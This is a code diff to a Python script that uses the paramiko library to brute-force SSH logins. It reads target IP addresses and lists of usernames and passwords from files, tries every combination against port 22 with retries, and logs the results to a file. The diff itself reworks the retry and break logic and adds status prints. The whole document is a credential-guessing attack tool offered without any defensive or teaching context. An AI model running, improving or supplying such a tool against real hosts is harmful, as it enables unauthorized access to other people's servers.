@@ -1,6 +1,7 @@
 import paramiko
 import time
 
+connected = False
 port = 22
 max_retries = 5
 
@@ -14,14 +15,16 @@ with open("programdata/pass.txt", "r") as f:
 with open("programdata/sships.txt", "r") as f, open("programdata/yay.txt", "w") as f2:
     for ip in f.readlines():
         host = ip.strip()
+        print(host)
         f2.write(f"\nIP Address: {host}\n")
         print(f"Trying to connect to {host}...")
         connected = False
         for i in range(max_retries):
-            if connected == True:
-                connected = False
-                break
             for username in usernames:
+                if connected:
+                    break
+                else:
+                    time.sleep(1)
                 for password in passwords:
                     try:
                         ssh = paramiko.SSHClient()
@@ -36,9 +39,9 @@ with open("programdata/sships.txt", "r") as f, open("programdata/yay.txt", "w") 
                         print(f"Failed login attempt to {host} with username '{username}' and password '{password}'")
                     except paramiko.SSHException as e:
                         print(f"Error connecting to {host}: {e}")
-            if connected:
-                break
+                
+            if connected == False:
+                print(f"Could not connect to {host} after {max_retries} retries")
             else:
-                time.sleep(1)
-        if not connected:
-            print(f"Could not connect to {host} after {max_retries} retries")
+                break
+print("Done")
